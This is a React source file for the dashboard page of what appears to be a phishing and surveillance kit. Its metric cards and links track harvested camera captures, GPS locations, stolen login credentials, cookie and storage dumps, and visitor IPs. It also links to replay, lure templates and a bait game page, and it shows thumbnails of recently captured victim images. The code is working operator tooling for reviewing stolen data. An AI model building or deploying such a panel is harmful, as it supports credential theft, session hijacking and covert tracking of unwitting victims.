import { useEffect, useState, useCallback } from 'react'
import { api, Stats } from '../api/client'
import ErrorBanner from '../components/ErrorBanner'

function MetricCard({ label, value, sub, icon }: { label: string; value: string | number; sub?: string; icon: string }) {
  return (
    <div className="metric-card">
      <div className="label">{icon} {label}</div>
      <div className="value">{value}</div>
      {sub && <div className="sub">{sub}</div>}
    </div>
  )
}

function CodePanel() {
  const params = new URLSearchParams(window.location.search)
  const code = params.get('code')
  if (!code) return null
  return (
    <div className="content-card">
      <h3 className="section-head">Access</h3>
      <div className="flex items-center gap-2">
        <code className="text-lg tracking-widest font-mono" style={{ color: 'var(--accent)' }}>{code}</code>
        <button onClick={() => navigator.clipboard.writeText(code!)}
          className="text-xs px-2 py-1 rounded"
          style={{ backgroundColor: 'var(--bg-tertiary)', color: 'var(--secondary)' }}>📋 Copy</button>
      </div>
      <p className="text-[10px] text-tertiary mt-2">Share this code with your team to access the dashboard</p>
    </div>
  )
}

export default function Dashboard() {
  const [stats, setStats] = useState<Stats | null>(null)
  const [loading, setLoading] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [lastUpdate, setLastUpdate] = useState('')
  const [error, setError] = useState<string | null>(null)
  const [recentCaptures, setRecentCaptures] = useState<{ url: string; id: string }[]>([])
  const [captureError, setCaptureError] = useState<string | null>(null)

  const refresh = useCallback(async () => {
    try {
      setError(null)
      setStats(await api.stats())
    } catch (e) { setError(e instanceof Error ? e.message : 'Failed to load stats') }
    try {
      setCaptureError(null)
      const data = await api.captures(1, 6)
      setRecentCaptures(data.captures.map(c => ({ url: c.url, id: c.id })))
    } catch { setCaptureError(null) }
    setLastUpdate(new Date().toLocaleTimeString())
    setLoading(false)
  }, [])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 10000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  if (loading) return <div className="flex justify-center py-20"><div className="spinner"></div></div>

  if (error && !stats) {
    return (
      <div className="empty-state animate-fade-in">
        <div className="icon">⚠️</div>
        <h3>Failed to load dashboard</h3>
        <p>{error}</p>
        <button onClick={refresh} className="inline-block mt-5 px-4 py-2 nav-link active">⟳ Retry</button>
      </div>
    )
  }

  const captureRate = stats && stats.total_captures > 0 && stats.first_capture
    ? (stats.total_captures / ((Date.now() / 1000 - stats.first_capture) / 3600)).toFixed(1)
    : '—'

  return (
    <div className="space-y-4 stagger">
      <ErrorBanner error={error} onDismiss={() => setError(null)} />

      <div className="flex items-center justify-between flex-wrap gap-2 animate-fade-in">
        <div>
          <h1 className="text-xl font-bold text-primary">Overview</h1>
          {lastUpdate && <p className="text-xs text-tertiary mt-0.5">Updated {lastUpdate}</p>}
        </div>
        <div className="flex items-center gap-2">
          <button onClick={() => setAutoRefresh(!autoRefresh)}
            className={`flex items-center gap-1.5 px-2.5 py-1.5 text-xs font-medium radius-sm transition-all cursor-pointer ${
              autoRefresh ? 'accent-bg accent' : 'text-tertiary'
            }`}>
            <span className={`w-1.5 h-1.5 rounded-full ${autoRefresh ? 'animate-pulse-dot' : ''}`}
              style={{ background: autoRefresh ? 'var(--accent)' : 'var(--color-muted)' }}></span>
            {autoRefresh ? 'Live' : 'Paused'}
          </button>
          <button onClick={refresh} className="px-2.5 py-1.5 text-xs text-tertiary hover:text-secondary radius-sm transition-colors cursor-pointer">⟳</button>
        </div>
      </div>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <MetricCard label="Captures" value={stats?.total_captures ?? 0}
          sub={`${(stats?.total_size_mb ?? 0).toFixed(2)} MB`} icon="📷" />
        <MetricCard label="Locations" value={stats?.total_locations ?? 0} sub="GPS" icon="📍" />
        <MetricCard label="Credentials" value={stats?.total_credentials ?? 0} sub="logins" icon="🔑" />
        <MetricCard label="Storage" value={stats?.total_storage_dumps ?? 0} sub="cookies" icon="🍪" />
      </div>

      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <MetricCard label="IPs" value={stats?.unique_ips ?? 0}
          sub={`${stats?.total_ips ?? 0} visits`} icon="🌐" />
        <MetricCard label="Data" value={`${(stats?.total_size_mb ?? 0).toFixed(1)}`} sub="MB" icon="💾" />
        <MetricCard label="Capture rate" value={captureRate} sub="per hour" icon="⚡" />
        <MetricCard label="Session age" value={stats?.first_capture
          ? `${Math.floor((Date.now() / 1000 - stats.first_capture) / 3600)}h`
          : '—'} sub={stats?.last_capture
            ? `${Math.floor((Date.now() / 1000 - stats.last_capture) / 60)}m ago`
            : 'waiting'} icon="⏱" />
      </div>

      <CodePanel />

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div className="content-card">
          <h3 className="section-head">Quick actions</h3>
          <div className="grid grid-cols-2 gap-1.5">
            <a href="/captures" className="nav-link active justify-center text-center">📷 Captures</a>
            <a href="/locations" className="nav-link active justify-center text-center">📍 Locations</a>
            <a href="/ips" className="nav-link active justify-center text-center">🌐 IPs</a>
            <a href="/credentials" className="nav-link active justify-center text-center">🔑 Credentials</a>
            <a href="/storage" className="nav-link active justify-center text-center">🍪 Storage</a>
            <a href="/replay" className="nav-link active justify-center text-center">⚡ Replay</a>
            <a href="/templates" className="nav-link active justify-center text-center">🎭 Templates</a>
            <a href="/t/face-runner" target="_blank" rel="noreferrer" className="nav-link active justify-center text-center">🎮 Game</a>
          </div>
        </div>

        <div className="content-card">
          <h3 className="section-head">System</h3>
          <div className="space-y-2.5">
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">App</span>
              <span className="flex items-center gap-1.5 text-xs" style={{ color: '#34c759' }}>
                <span className="w-1.5 h-1.5 rounded-full" style={{ background: '#34c759' }}></span>
                Online
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">Database</span>
              <span className="flex items-center gap-1.5 text-xs" style={{ color: '#34c759' }}>
                <span className="w-1.5 h-1.5 rounded-full" style={{ background: '#34c759' }}></span>
                Connected
              </span>
            </div>
            <div className="flex items-center justify-between py-1">
              <span className="text-sm text-tertiary">TrailBase</span>
              <a href={(import.meta.env.VITE_TRAILBASE_URL || '').replace(/\/+$/, '') + '/_/admin/'} target="_blank" rel="noreferrer" className="flex items-center gap-1.5 text-xs accent hover:underline">
                <span className="w-1.5 h-1.5 rounded-full" style={{ background: 'var(--accent)' }}></span>
                Admin
              </a>
            </div>
          </div>
        </div>
      </div>

      {recentCaptures.length > 0 && (
        <div className="content-card">
          <h3 className="section-head">Recent captures</h3>
          <div className="grid grid-cols-3 md:grid-cols-6 gap-2">
            {recentCaptures.map((c, i) => (
              <a key={c.id} href={c.url} target="_blank" rel="noreferrer"
                 className="block aspect-video bg-tertiary radius-sm overflow-hidden hover:ring-1 ring-accent transition-all animate-fade-up"
                 style={{ animationDelay: `${i * 0.04}s` }}>
                <img src={c.url} alt="" className="w-full h-full object-cover" />
              </a>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}
